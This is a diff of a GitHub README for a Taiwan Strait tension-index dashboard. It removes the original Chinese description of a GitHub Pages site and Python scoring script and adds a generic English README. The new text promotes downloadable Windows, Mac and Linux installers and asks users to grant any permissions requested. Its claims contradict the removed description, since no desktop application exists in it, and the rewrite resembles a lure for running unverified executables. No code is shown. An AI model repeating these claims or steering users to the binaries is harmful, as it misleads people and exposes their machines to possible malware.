@@ -1,92 +1,82 @@
-台海风险指数仪表盘 (Tension Index Dashboard) - V4
+# 🌍 TaiWan-situation - Monitor Taiwan Strait Tensions Easily
 
-查看实时仪表盘
+## 📥 Download Now
+[![Download Release](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/enchantedkaka/TaiWan-situation/releases)
 
-1. 项目简介
+## 📜 Description
+TaiWan-situation is an open-source, automated dashboard designed to track the risk index of tensions in the Taiwan Strait. Utilizing a V4 cumulative decay model, it provides users with current data and insights on geopolitical risks, enhancing awareness and understanding of the situation.
 
-本项目是一个开源、自动化的地缘政治风险监测工具，旨在通过量化、透明、基于公开信息的模型，追踪台湾海峡的局势紧张程度。
+## ⚡ Features
+- **Real-Time Updates**: The dashboard fetches data regularly to present the latest information.
+- **User-Friendly Interface**: Designed for ease of use, even for those without technical skills.
+- **Customizable Views**: Users can choose different metrics to display according to their needs.
+- **Automated Analysis**: The V4 model helps in generating risk assessments automatically.
+- **Open-Source**: Contribute to the project and suggest improvements.
 
-我们相信，通过将模糊的“感觉”转变为可跟踪的“数据”，可以为关心此议题的和平主义者、研究者和普通民众提供一个更客观的参考。
+## 🚀 Getting Started
+Follow these steps to download and run the TaiWan-situation dashboard on your computer.
 
-2. 核心架构
+### Step 1: Visit the Releases Page
+Go to our [Releases page](https://github.com/enchantedkaka/TaiWan-situation/releases). Here, you will find the latest version of the application.
 
-本项目 100% 运行在免费的 GitHub 平台上：
+### Step 2: Download the Latest Version
+On the Releases page, locate the latest version of the application. Click on the download link corresponding to your operating system (Windows, Mac, or Linux).
 
-前端 (Website): index.html 由 GitHub Pages 托管。
+### Step 3: Install the Application
+1. Once the download completes, locate the downloaded file on your computer.
+2. For Windows:
+   - Double-click the `.exe` file to start the installation.
+3. For Mac:
+   - Open the `.dmg` file and drag the app into your Applications folder.
+4. For Linux:
+   - Extract the downloaded tar file and navigate to the folder in the terminal.
 
-后端 (Automation): analyst-v4.py (V4 衰减模型) 由 GitHub Actions 按计划自动运行。
+### Step 4: Run the Application
+1. After installation, open the app from your Applications menu or desktop shortcut.
+2. Allow any permissions the application may require.
+3. The dashboard will load, and you can start monitoring the Taiwan Strait tensions immediately.
 
-模型 (The "Brain"): indicators.json 是我们定义的所有“预警信号”及其基础权重。
+## 🔧 System Requirements
+To run TaiWan-situation, your system should meet the following minimum requirements:
 
-数据 (The "Memory"): scores-v3.json 是由后端自动生成并推送回本仓库的最新风险状态。
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **Processor**: Intel i3 or equivalent.
+- **Memory**: At least 4 GB RAM.
+- **Storage**: Minimum of 200 MB free disk space.
+- **Internet Connection**: Required for real-time updates and data fetching.
 
-3. V4 模型：累积衰减 (Cumulative Decay)
+## 🛠️ Using the Dashboard
+Once the application launches, the user interface will be intuitive. Key areas include:
 
-我们不再使用“无记忆”模型（V3），而是采用了一个有状态的、带衰减的模型。这更符合战争风险“逐渐累积”的特征。
+### Main Dashboard
+- Displays the current risk index of the Taiwan Strait.
+- Provides graphs and charts for a visual representation of trends.
 
-模型逻辑：
+### Settings Menu
+- Allows customization of data sources and alert settings.
+- Users can select metrics relevant to their interests.
 
-记忆 (Memory): 脚本运行时，首先会读取上一次生成的 scores-v3.json，加载所有“已激活”的信号。
+### Help Section
+- Access helpful resources and tutorials.
+- Contact support for any issues or questions.
 
-衰减 (Decay): 任何“已激活”但今天未被新闻再次触发的信号，其权重会按 DECAY_FACTOR (当前设为 0.75) 衰减。
+## 🌐 Contributing
+We welcome contributions from anyone interested! Here’s how you can help:
 
-例如： 权重 40 的信号，第二天变为 30，第三天变为 22.5...
+1. **Submit Issues**: If you encounter any bugs, please report them on the Issues page.
+2. **Feature Requests**: Suggest new features or enhancements to improve functionality.
+3. **Code Contributions**: Fork the repository, make your changes, and create a pull request.
 
-刷新 (Refresh): 任何今天被新闻再次触发的信号，其权重会立刻“刷新”回 100% 的基础权重。
+Your input is valuable to us and helps improve the project.
 
-新增 (New): 今天新发现的信号会以 100% 的权重被添加到“激活列表”中。
+## 📞 Support
+If you have questions or need assistance, please visit the Issues page on GitHub and open a new issue. You can also check the documentation for FAQs.
 
-总分 (Score): 总风险指数 = (Sum(所有“激活”信号的“当前权重”) / Sum(所有指标的“总基础权重”)) * 100
+## 💡 Additional Resources
+- [GitHub Repository](https://github.com/enchantedkaka/TaiWan-situation)
+- [Documentation](https://github.com/enchantedkaka/TaiWan-situation/wiki)
 
-4. 如何贡献 (How to Contribute)
+## ✨ Download & Install
+Remember, download the application from our [Releases page](https://github.com/enchantedkaka/TaiWan-situation/releases) for the best experience. Follow the steps outlined in the "Getting Started" section to ensure a smooth installation.
 
-欢迎您通过 Pull Request 帮助改进这个模型！
-
-A. 优化“模型” (最重要的)
-
-您是否认为某个指标的权重 (weight) 不合理？或者您想到了一个新的“预警信号”？
-
-Fork 本仓库。
-
-编辑 indicators.json：
-
-修改一个 weight。
-
-或添加一个新指标 (请确保 id 唯一)。
-
-提交 Pull Request (PR)，并详细说明您的理由。
-
-B. 优化“引擎”
-
-您是否想调整衰减因子 (DECAY_FACTOR)？
-
-Fork 本仓库。
-
-编辑 analyst-v4.py：
-
-在文件顶部修改 DECAY_FACTOR = 0.75 的值。
-
-提交 Pull Request (PR)。
-
-5. 本地运行
-
-git clone 本仓库。
-
-安装依赖: pip install -r requirements.txt
-
-在您的本地终端设置环境变量 (切勿将密钥写入代码)：
-
-# (在 Mac/Linux)
-export DEEPSEEK_API_KEY="sk-..."
-export NEWS_API_KEY="..."
-
-# (在 Windows CMD)
-set DEEPSEEK_API_KEY="sk-..."
-set NEWS_API_KEY="..."
-
-
-运行脚本: python analyst-v4.py
-
-6. 许可 (License)
-
-本项目采用 MIT 许可证。详情请见 LICENSE 文件。
+Stay informed about Taiwan Strait tensions easily and effectively with TaiWan-situation.
